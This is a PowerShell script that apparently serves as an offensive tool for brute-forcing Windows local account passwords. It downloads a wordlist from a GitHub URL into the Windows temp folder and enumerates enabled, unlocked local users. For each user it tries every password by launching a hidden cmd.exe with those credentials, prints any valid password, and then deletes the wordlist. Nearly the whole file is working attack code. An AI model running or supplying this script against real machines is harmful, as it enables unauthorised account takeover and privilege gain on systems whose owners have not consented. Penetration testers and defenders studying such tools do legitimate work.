$MaximumHistoryCount = 999
$ErrorActionPreference = "SilentlyContinue"
Write-Host ""
Write-Host ""

$url = "https://raw.githubusercontent.com/The-Viper-One/LocalAccountBruteforce/main/LocalAccPass.txt"
$file = "C:\Windows\temp\passwords.txt"

# Download the file to the local directory
Invoke-WebRequest -Uri $url -OutFile $file -ErrorAction Stop

# Read the file contents from the local disk
$passwords = Get-Content $file

$users = Get-WmiObject Win32_UserAccount -Filter "LocalAccount='True' and Disabled='False' and Lockout='False' and SIDType='1'" | Select-Object -ExpandProperty Name

foreach ($user in $users) {
    Write-Host "[/] Testing $user"

    $passwordFound = $false

    foreach ($password in $passwords) {
        $secPassword = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($user, $secPassword)
        $null = Start-Process cmd.exe -Credential $credential -ArgumentList "/c echo `hello" -WindowStyle Hidden -ErrorAction SilentlyContinue
        if ($?) {
            Write-Host "[+] Valid Password: $Password" -ForegroundColor Green
            Write-Host ""
            $passwordFound = $true
            break
        }
     }

     if (!$passwordFound) {
        Write-Host "[-] No valid passwords found" -ForegroundColor Red
        Write-Host ""
     }
}

# Remove the file from the local directory
Remove-Item $file
